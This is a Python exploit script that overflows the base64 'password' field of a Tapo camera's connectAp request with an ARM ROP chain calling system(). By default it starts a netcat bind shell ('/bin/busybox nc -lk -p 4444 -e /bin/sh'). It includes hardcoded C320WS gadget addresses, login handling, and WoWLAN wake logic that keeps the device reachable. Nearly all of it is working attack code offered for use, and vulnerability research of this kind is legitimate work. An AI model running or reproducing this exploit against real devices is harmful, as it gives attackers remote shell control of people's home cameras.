#!/usr/bin/env python3
"""Send the connectAp ROP chain (pop -> system@plt -> pivot) to a Tapo camera.

The chain is address-free apart from three fixed `.text` addresses in a non-PIE
binary:

  saved pc -> `pop {r3..r11, pc}`      r3 = system@plt, pc = pivot
  pivot    -> `add r1, sp, #4; mov r0, sp; blx r3`   calls system(sp)
  sp       -> the NUL-terminated command

so no stack address is guessed. The three offsets are build-specific; the
C320WS 1.5.3/1.6.4 values are the defaults and must be re-derived from the
target's own `/bin/main` (same shape: find the `mbedtls_base64_decode` wrapper,
read its epilogue for the saved-pc offset, then find the three gadgets).

Usage:
  tapo_connectap_rop.py <host> [--cmd CMD] [--offset N] [--pop A] [--pivot A] [--system A]
                        [--ssid SSID] [--bssid MAC]

Default command starts a bind shell on :4444.
"""
import argparse
import base64
import json
import struct
import subprocess
import sys
import time

import hashlib

C320 = {"offset": 0x424, "pop": 0x00020004, "pivot": 0x000E1080, "system": 0x0001B468}


def payload(cmd: str, t: dict, prefix: bytes = b"") -> tuple[str, int]:
    cmd_b = cmd.encode() + b"\0"
    first = t["offset"] + 4
    command_at = first + 10 * 4
    buf = bytearray(b"A" * (command_at + len(cmd_b)))
    if prefix:
        # the handler hands the decrypted password to wpa_supplicant and only
        # reads to the first NUL: lead with the real PSK so the join succeeds
        # and only the process restarts instead of the radio.
        buf[0:len(prefix) + 1] = prefix + b"\0"
    buf[t["offset"]:t["offset"] + 4] = struct.pack("<I", t["pop"])
    chain = [t["system"]] + [0x41414141] * 8 + [t["pivot"]]
    for i, word in enumerate(chain):
        buf[first + i * 4:first + i * 4 + 4] = struct.pack("<I", word)
    buf[command_at:command_at + len(cmd_b)] = cmd_b
    return base64.b64encode(bytes(buf)).decode(), len(buf)


def post(host: str, path: str, body: dict, timeout: int = 8) -> str:
    r = subprocess.run(["curl", "-sk", "--interface", "en1", "-m", str(timeout), "-H", "Content-Type: application/json",
                        "-H", "User-Agent: Tapo CameraClient Android", "-X", "POST",
                        "-d", json.dumps(body), "https://%s%s" % (host, path)],
                       capture_output=True, text=True)
    return r.stdout


def sha(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest()


def login(host: str, tries: int = 60) -> dict:
    """Delegate to the shared DS client: it speaks both the legacy `device_confirm`
    flow and the RSA/securePassthrough challenge this firmware switched to. This tool
    kept its own device_confirm-only copy and therefore never logged in at all."""
    import tapo_connectap_sc as _sc
    return _sc.login(host, tries=tries)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("--cmd", default="/bin/busybox nc -lk -p 4444 -e /bin/sh &")
    ap.add_argument("--offset", type=lambda x: int(x, 0), default=C320["offset"])
    ap.add_argument("--pop", type=lambda x: int(x, 0), default=C320["pop"])
    ap.add_argument("--pivot", type=lambda x: int(x, 0), default=C320["pivot"])
    ap.add_argument("--system", type=lambda x: int(x, 0), default=C320["system"])
    ap.add_argument("--prefix", default="", help="real Wi-Fi PSK to lead with")
    ap.add_argument("--ssid", default="Aardvark")
    ap.add_argument("--bssid", default="00:00:00:00:00:00")
    ap.add_argument("--mac", default=None, help="wake with WoWLAN before logging in")
    a = ap.parse_args()

    if a.mac:
        # the unit re-sleeps within seconds, so the wake has to sit right in front of the
        # login — a separate "reach" step burns the window it just created
        import tapo_wake, socket
        pkt_mac = a.mac
        for _ in range(90):
            tapo_wake.send(pkt_mac, a.host, False, 2, 0.2)
            c = socket.socket(); c.settimeout(0.4)
            ok = c.connect_ex((a.host, 443)) == 0
            c.close()
            if ok:
                # a connect is not a serving DS: after a crash the socket accepts and
                # answers nothing (measured), so require a real login reply
                try:
                    probe = post(a.host, "/", {"method": "login", "params": {
                        "cnonce": "", "encrypt_type": "3", "username": "admin"}}, timeout=2)
                    ok = bool(probe and probe.strip().startswith("{"))
                except Exception:
                    ok = False
            if ok:
                print("awake")
                # keep the radio awake for the whole login+frame: left alone the unit
                # re-sleeps in seconds and the login lands on a closed port
                import threading
                stop = threading.Event()

                def _keep():
                    while not stop.is_set():
                        tapo_wake.send(pkt_mac, a.host, False, 1, 0.25)
                        time.sleep(0.25)

                threading.Thread(target=_keep, daemon=True).start()
                break
            time.sleep(0.6)
        else:
            print("wake failed")
            return 1

    sess = login(a.host)
    print("stok ok")
    b64, n = payload(a.cmd, {"offset": a.offset, "pop": a.pop, "pivot": a.pivot,
                             "system": a.system}, a.prefix.encode())
    print("payload %d decoded bytes; cmd: %s" % (n, a.cmd))
    # the connect object IS params; the onboarding wrapper is refused (-40209/-40214)
    body = {"method": "connectAp", "params": {
        "ssid": a.ssid, "bssid": a.bssid, "auth": 1, "encryption": 3, "rssi": -50,
        "password": b64, "unique_key": 0, "band": 0}}
    t0 = time.time()
    try:
        out = post(a.host, "/stok=%s/ds" % sess["stok"], body, timeout=10)
        print("resp %dB in %.1fs: %s" % (len(out), time.time() - t0, out[:200]))
    except Exception as exc:
        print("conn dropped", exc)
    return 0


if __name__ == "__main__":
    sys.exit(main())
